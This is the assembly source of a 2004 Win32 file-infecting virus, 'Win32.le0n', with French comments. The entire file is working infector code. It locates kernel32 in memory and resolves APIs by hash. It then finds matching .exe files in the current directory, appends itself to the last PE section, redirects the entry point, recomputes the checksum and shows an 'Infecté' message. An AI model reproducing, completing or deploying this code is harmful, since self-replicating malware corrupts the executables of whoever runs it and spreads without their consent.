;FICHIER : main.asm
;NOM     : Win32.le0n
;DATE    : 24/10/2004
;VERSION : 0.1
;AUTEUR  : kaze <kaze_0mx@yahoo.fr>    


; Squelette d'un virus win32. Infecte tous les fichiers de type kaze*.exe du repertoire courant.
; Last section appender. Aucun test pour voir si le fichier a deja ete infecte. Recalcul du crc32.
; Import des apis via crc (cf crc_calc.exe).
; 
; Have fun



.386p
.model flat,STDCALL

call_ macro x
        call [ebp+x]
endm

extrn ExitProcess:PROC
extrn MessageBoxA:PROC

.data

Signature db 'Exemple',0




;======================================= CODE =================================
.code

start:
        jmp encrypted_stuff



;======================================= DECRYPTEUR ===========================
debut_virus:












;======================================= CORPS ================================
encrypted_stuff:
        call delta
delta:  pop ebp
        sub ebp,offset delta
        
; sauvegarde quelques variables
        lea esi,[ebp+a_sauvegarder]
        lea edi,[ebp+sauvegarde]
        mov ecx,taille_sauvegarde
        rep movsb
        
; cherche l'adresse de kernel32
find_kernel:
        mov edx,[esp]
        mov ecx,60
        xor eax,eax
        and dx,word ptr 0F000h
        

        call seh
seh_handler:
        mov esp,[esp+8]
        mov ebx,[esp+4]
        mov fs:[eax],ebx
        jmp find_it
seh:
        push dword ptr fs:[eax]
        mov fs:[eax],esp
find_it:
        sub edx,1000h
        dec ecx
        jz k32_not_found
        cmp word ptr [edx],'ZM'
        jnz find_it
        mov ebx,[edx+60]
        add ebx,edx
        cmp word ptr [ebx],'EP'
        jnz find_it
        pop dword ptr fs:[eax]
        pop eax


;récupère toutes les apis
        lea esi,[ebp+liste_apis_k32]            ;apis de k32
        lea edi,[ebp+apis_k32]
        call find_apis
        
        lea eax,[ebp+name_user32]               ;apis de user32
        push eax
        call_ LoadLibrary
        mov edx,eax
        lea esi,[ebp+liste_apis_u32]
        lea edi,[ebp+apis_u32]
        call find_apis

        and [ebp+calc_chksum],dword ptr 0       ;CheckSumMappedFile (optionnel)
        lea eax,[ebp+name_imagehlp]
        push eax
        call_ LoadLibrary
        test eax,eax
        jz no_image_help
        
        lea ebx,[ebp+imagehlp_api]
        push ebx
        push eax
        call_ GetProcAddress
        mov [ebp+calc_chksum],eax
        
no_image_help:

        and [ebp+sfc_protected],dword ptr 0     ;SfcIsfilePtrotected (optionnel)
        lea eax,[ebp+name_sfc]
        push eax
        call_ LoadLibrary
        test eax,eax
        jz no_sfc
        lea ebx,[ebp+sfc_api]
        push ebx
        push eax
        call_ GetProcAddress
        mov [ebp+sfc_protected],eax
no_sfc:




;infecte le rep courant
        call infect_rep
        
;payload
        xor ebx,ebx
        lea eax,[ebp+msg_payload]
        push ebx
        push eax
        push eax
        push ebx
        call_ MessageBox


retour_hote:
        jmp [ebp+sauve_ancien_ep]
        
        
        

k32_not_found:
        jmp $















;======================================= FONCTIONS ============================



;INFECTE_PE     in: eax--> PE mappé en memoire
;               out : none
infecte_pe proc near
        pusha
        mov edx,[eax+3Ch]
        add edx,eax
        mov ebx,eax

        xor eax,eax
        lea esi,[edx+18h]
        movzx ecx, word ptr [edx+14h]           ;SizeOfOptionalHeader
        add esi,ecx                             ;esi-->sections
        movzx ecx,word ptr [edx+06h]
cherche_derniere_sec:
        cmp [esi+12],eax
        jb ch2
        mov eax,[esi+12]
        mov edi,esi
ch2:    add esi,28h
        loop cherche_derniere_sec

        mov ecx,[edi+8]
        cmp ecx,[edi+16]
        ja infecte_pas                          ;si vsize>rawsize infecte pas
        
        mov ecx,[edx+28h]
        add ecx,[ebp+imagebase]
        mov [ebp+ancien_ep],ecx
                                                ;edi-->derniere section (en ram)
        add eax,[edi+8]                         ;ajoute VSize
        mov [edx+28h],eax
        add eax,[ebp+imagebase]
        mov [ebp+virus_va],eax
        

        mov esi,[edi+20]                        ;RawAddress
        add esi,[edi+8]                         ;VirtualSize
        add esi,ebx                             ;adresse du filemapping

        mov ecx,[ebp+taille_virus_alignee]
        add [edi+8],dword ptr (((virus_len+heap_len)/4096)+1)*4096    ;TODO: +taille des imports +decrypteur
        add [edi+16],ecx                               ;RawSize
        or [edi+36],0F0000060h

        lea edi,[ebp+debut_virus]
        xchg esi,edi
        mov ecx,virus_len
        rep movsb
        
        add [edx+50h],dword ptr (((virus_len+heap_len)/4096)+1)*4096  ;TODO: +taille des imports +decrypteur

        mov ecx,[ebp+calc_chksum]
        jecxz infecte_pas               ;si CheckSumpMappedFile non present ...
        
        lea esi,[ebp+checksum]
        push esi
        lea eax,[esi+4]
        push eax
        push dword ptr [ebp+WFD_nFileSizeLow]
        push ebx
        call ecx
                                        ;eax--> PE_Header mappé en RAM
        mov ecx,[esi]
        mov [eax+58h],ecx               ;enregistre la nouvelle checksum
        
        
infecte_pas:
        popa
        ret
infecte_pe endp


;INFECTION :    in : ebx--> Filename, WFD rempli avec un .exe
;               out : none
infection proc near
        pusha
        push 80h                ;ATTRIB_NORMAL
        push ebx
        call_ SetFileAttributes
        xor eax,eax
        push eax
        push eax
        push 3
        push eax
        inc eax
        push eax
        push 0C0000000h
        push ebx
        call_ CreateFile
        inc eax
        jz peuxpas
        dec eax
        mov [ebp+Fhandle],eax

        mov edi,[ebp+WFD_nFileSizeLow]
        call create_mapped_file
        test eax,eax
        jz mappas
        mov [ebp+Mhandle],eax
        call map_file                   ; eax=map_offset
        test eax,eax
        jz veuxpas
        mov esi,[eax+3Ch]
        cmp esi,edi
        jae pasbon                      ;si MZ, evite les violation de pages
        add esi,eax
        cmp dword ptr [esi],'EP'
        jnz pasbon
        mov ecx,[esi+34h]
        mov [ebp+imagebase],ecx
        mov esi,[esi+3Ch]                 ;File Alignement

        push eax
        call_ UMVOFile
        push [ebp+Mhandle]
        call_ CloseHandle

        xor edx,edx
        mov eax,virus_len       ;edi=fichier+virus  TODO: +taille des imports +decrypteur
        div esi
        inc eax
        mul esi
        mov [ebp+taille_virus_alignee],eax
        add edi,eax
        call create_mapped_file
        mov [ebp+Mhandle],eax
        call map_file           ; eax=map_offset

        call infecte_pe

pasbon: push eax
        call_ UMVOFile
veuxpas:push [ebp+Mhandle]
        call_ CloseHandle
mappas: push [ebp+Fhandle]
        call_ CloseHandle
peuxpas:push dword ptr [ebp+WFD_dwFileAttributes]
        push ebx
        call_ SetFileAttributes
        popa
        ret
infection endp


;FIND_APIS: in: esi--> ckecksums(terminé par -1) edi--> apis[] edx=HMODULE*
;           out: edi rempli
find_apis proc near
        mov ebx,[edx+60]
        add ebx,edx                     ; ebx--> PE Header
        mov ecx,[ebx+78h]
        add ecx,edx                     ; ecx--> export table
        mov eax,[ecx+01ch]              ; sauve les adresses des tables
        add eax,edx
        lea ebx,[ebp+lst_fnc]           ; liste des adresses de fonctions
        mov [ebx],eax
        add ebx,4
        mov eax,[ecx+24h]               ; liste des ordinals
        add eax,edx
        mov [ebx],eax
        mov ebx,[ecx+20h]               ; ebx-->liste des noms
        xor ecx,ecx
        add ebx,edx
fa1:    mov eax,[ebx+ecx*4]
        add eax,edx
        call calc_crc
        cmp eax,[esi]                   ; est-ce la fonction recherchée ?
        jz fa2
        inc ecx
        jmp fa1
fa2:    push esi
        mov esi,[ebp+lst_ord]           ; choppe l'ordinal (marche en //)
        movzx eax,word ptr [esi+ecx*2]
        mov esi,[ebp+lst_fnc]           ; et on s'en sert pour chopper l'adresse de l'api
        mov eax,[esi+eax*4]
        add eax,edx                     ; (RVA)
        stosd                           ; on la stock
        pop esi
        inc ecx
        add esi,4                       ; api suivante
        inc dword ptr [esi]             ; esi==0xFFFFFFF ?
        jz fa3
        dec dword ptr[esi]
        jmp fa1
fa3:    dec dword ptr[esi]
        ret
find_apis endp

;CALC_CRC: in: eax--> apiname
;          out: eax=crc
calc_crc proc near
        push ecx
        push esi
        mov esi,eax
        xor eax,eax
        sub ecx,ecx
cc1:    lodsb
        test al,al
        jz cc2
        add cl,al
        rol eax,cl
        add ecx,eax
        jmp cc1
cc2:    mov eax,ecx
        pop esi
        pop ecx
        ret
calc_crc endp

;INFECT_REP     in : none
;               out : none
infect_rep proc near
        lea esi,[ebp+WFD]
        lea eax,[ebp+mask]
        push esi
        push eax
        call_ FindFirstFile
        inc eax
        jz badrep
        dec eax
        mov [ebp+Shandle],eax
unautreverre?:
        lea ebx,[ebp+WFD_szFileName]
        cmp dword ptr [ebx],'LPXE'
        jz pas_touche
        call infection
pas_touche:
        lea eax,[ebp+WFD]
        push eax
        push [ebp+Shandle]
        call_ FindNextFile
        test eax,eax            ;dernier fichier ?
        jnz unautreverre?
        push [ebp+Shandle]
        call_ FindClose
badrep: ret
infect_rep endp

;MAP_FILE :     in: edi=taille
;               out: none
map_file proc near
        xor     eax,eax
        push    edi
        push    eax
        push    eax
        push    00000002h
        push    [ebp+Mhandle]
        call_    MVOFile
        ret
map_file         endp

;CREATE_MAPPED_FILE :   in : edi=taille
;                       out : none
create_mapped_file proc near
        xor eax,eax
        push eax
        push edi
        push eax
        push 00000004h
        push eax
        push [ebp+Fhandle]
        call_ CreateFileMapping
        ret
create_mapped_file endp










;======================================= DATA =================================

a_sauvegarder:

ancien_ep       dd offset first_gen
imagebase       dd 040000h

taille_sauvegarde equ $ - a_sauvegarder

k32_oft         dd 0
k32_ft          dd 0
a32_oft         dd 0
a32_ft          dd 0

msg_payload     db 'Infecté',0
mask            db 'test*.exe',0
name_user32     db 'user32.dll',0
name_imagehlp   db 'imagehlp.dll',0
imagehlp_api    db 'CheckSumMappedFile',0
name_sfc        db 'sfc.sll',0
sfc_api         db 'SfcIsFileProtected',0

liste_apis_k32:
        dd 0FDBE9DDFh           ; CloseHandle
        dd 04B00FBA1h           ; CreateFileA
        dd 00D6EA22Eh           ; CreateFileMappingA
        dd 0BE307C51h           ; CreateThread
        dd 04E5DE044h           ; ExitThread
        dd 0BE7B8631h           ; FindClose
        dd 0C915738Fh           ; FindFirstFileA
        dd 08851F43Dh           ; FindNextFileA
        dd 028F8C6FBh           ; GetCurrentDirectoryA
        dd 09C3A5210h           ; GetDriveTypeA
        dd 040BF2F84h           ; GetProcAddress
        dd 05D0915E3h           ; GetWindowsDirectoryA
        dd 095765835h           ; LoadLibraryA
        dd 01064BF83h           ; LocalAlloc
        dd 032BEDDC3h           ; MapViewOfFile
        dd 08E0E5487h           ; SetCurrentDirectoryA
        dd 050665047h           ; SetFileAttributesA
        dd 03A00E23Bh           ; Sleep
        dd 0FAE00D65h           ; UnmapViewOfFile
        dd 0FFFFFFFFh
        
liste_apis_u32:
        dd 0C0059B5Fh           ; MessageBoxA
        dd 0FFFFFFFFh

virus_len equ ($ - debut_virus)









;======================================= BSS ==================================

apis_k32:
CloseHandle             dd ?
CreateFile              dd ?
CreateFileMapping       dd ?
CreateThread            dd ?
ExitThread              dd ?
FindClose               dd ?
FindFirstFile           dd ?
FindNextFile            dd ?
GetCurrentDirectory     dd ?
GetDriveType            dd ?
GetProcAddress          dd ?
GetWindowsDirectory     dd ?
LoadLibrary             dd ?
LocalAlloc              dd ?
MVOFile                 dd ?
SetCurrentDirectory     dd ?
SetFileAttributes       dd ?
Sleep                   dd ?
UMVOFile                dd ?

; USER32.dLL
apis_u32:
MessageBox              dd ?


;DIVERS
lst_fnc                 dd ?
lst_ord                 dd ?
lst_noms                dd ?
Fhandle                 dd ?
Mhandle                 dd ?
Shandle                 dd ?

WFD label   byte
WFD_dwFileAttributes    dd      ?
WFD_ftCreationTime      dd      ?
                        dd      ?
WFD_ftLastAccessTime    dd      ?
                        dd      ?
WFD_ftLastWriteTime     dd      ?
                        dd      ?
WFD_nFileSizeHigh       dd      ?
WFD_nFileSizeLow        dd      ?
WFD_dwReserved0         dd      ?
WFD_dwReserved1         dd      ?
WFD_szFileName          db      260 dup (?)
WFD_szAlternateFileName db      13 dup (?)
                        db      03 dup (?)

SavedDirectory          db 260 dup (?)




taille_virus_alignee    dd ?
sfc_protected           dd ?
calc_chksum             dd ?

checksum                dd ?
old_checksum            dd ?

virus_va                dd ?


sauvegarde:

sauve_ancien_ep         dd ?
sauve_imagebase         dd ?


heap_len equ ($ - debut_virus) - virus_len




;======================================= PREMIERE GENERATION ==================
first_gen:
        call MessageBoxA,0,offset taille_virus,offset Signature,0
        call ExitProcess,0

taille_virus db 'Taille du virus : ',virus_len/10000+48,(virus_len MOD 10000)/1000+48,(virus_len MOD 1000)/100+48,(virus_len MOD 100)/10+48,virus_len MOD 10+48,0
printdec proc near              ;c vite-fait ...
        pusha
        cld
        lea edi,buf
        mov ebx,10
        xor ecx,ecx
GUI_printdec_1:
        xor edx,edx
        div ebx
        push edx
        inc ecx
        test eax,eax
        jnz GUI_printdec_1
GUI_prindec_2:
        pop eax
        add eax,48
        stosb
        loop GUI_prindec_2
        xor al,al
        stosb
        push 0
        push offset Signature
        push offset buf
        push 0
        call MessageBoxA
        popa
        ret
printdec endp
buf db 20 dup (?)

end start
        
